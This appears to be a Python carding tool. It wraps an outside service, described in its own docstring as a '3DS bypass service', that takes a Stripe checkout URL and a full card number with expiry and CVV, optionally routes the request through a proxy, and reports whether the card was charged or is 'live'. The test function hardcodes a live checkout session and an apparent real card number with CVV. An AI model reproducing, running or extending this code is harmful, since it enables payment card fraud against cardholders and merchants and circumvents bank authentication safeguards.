import asyncio
import aiohttp
import urllib.parse
import json
import logging
import time

logger = logging.getLogger("hitbot")

class HitbotAPI:
    """Wrapper for hitbot-api.kamalxd.workers.dev - external 3DS bypass service"""
    
    BASE_URL = "https://hitbot-api.kamalxd.workers.dev/"
    
    def __init__(self):
        self.session = None
    
    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def charge_card(self, checkout_url: str, cc: str, proxy: str = None) -> dict:
        """
        Charge a card through the hitbot API
        
        Args:
            checkout_url: Stripe checkout URL
            cc: Card in format num|mm|yy|cvv
            proxy: Optional proxy in format ip:port or ip:port:user:pass
        
        Returns:
            dict with success, status, message, 3ds info, etc.
        """
        params = {
            "checkout": checkout_url,
            "cc": cc
        }
        if proxy:
            params["proxy"] = proxy
        
        query = urllib.parse.urlencode(params)
        url = f"{self.BASE_URL}?{query}"
        
        logger.info(f"Calling hitbot API for card {cc[:6]}******{cc[-4:]}")
        start = time.time()
        
        try:
            async with self.session.get(url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
                text = await resp.text()
                elapsed = time.time() - start
                
                try:
                    data = json.loads(text)
                except json.JSONDecodeError:
                    logger.error(f"Invalid JSON response: {text[:200]}")
                    return {
                        "success": False,
                        "status": "error",
                        "message": f"Invalid API response: {text[:200]}",
                        "elapsed_seconds": elapsed
                    }
                
                logger.info(f"Hitbot API response in {elapsed:.2f}s: {data.get('status')} - {data.get('message', 'N/A')[:50]}")
                
                # Normalize response format
                result = {
                    "success": data.get("charged", False) or data.get("success", False),
                    "charged": data.get("charged", False),
                    "status": data.get("status", "unknown"),
                    "message": data.get("message", "No message"),
                    "live": data.get("live", False),
                    "card": data.get("card", {}),
                    "bin": data.get("bin", {}),
                    "checkout": data.get("checkout", {}),
                    "3ds": data.get("3ds", {}),
                    "proxy": data.get("proxy", {}),
                    "elapsed_seconds": data.get("elapsed_seconds", f"{elapsed:.2f}"),
                    "raw": data
                }
                
                return result
                
        except asyncio.TimeoutError:
            logger.error("Hitbot API timeout")
            return {
                "success": False,
                "status": "timeout",
                "message": "API request timed out after 60s",
                "elapsed_seconds": 60
            }
        except Exception as e:
            logger.error(f"Hitbot API error: {e}")
            return {
                "success": False,
                "status": "error",
                "message": str(e),
                "elapsed_seconds": time.time() - start
            }


async def test_hitbot():
    """Test the hitbot API wrapper"""
    checkout_url = 'https://checkout.stripe.com/g/pay/cs_live_agaQ2GruMinMVfoqWt2tuNzTTniqLBM7UlRh73nADsgMvKF49D2XUXmNPk#fidnandhYHdWcXxpYCc%2FJ2FgY2RwaXEnKSdicyc%2FNiknZHVsTmB8Jz8ndW5aaWxzYFowNFEzd1JKV3RtNDNyQ2Z9bUNuUn1OSk1naUdGPTV8PXBQfUtuQHJiRjVOTH9ISU5VRk5daTJ9NmJDaV0zdGc9T31oV2RzXGJJdW5PRzFwRklGZzRhcEddQzU1dmxcR1Y1a04nKSdjd2poVmB3c2B3Jz9xd3BgKSdnZGZuYndqcGthRmppancnPycmYz1kYTxhJyknaWR8anBxUXx1YCc%2FJ3Zsa2JpYFpscWBoJ3gl'
    cc = '4347697128163000|09|30|533'
    
    async with HitbotAPI() as api:
        result = await api.charge_card(checkout_url, cc)
        print(json.dumps(result, indent=2))


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(test_hitbot())
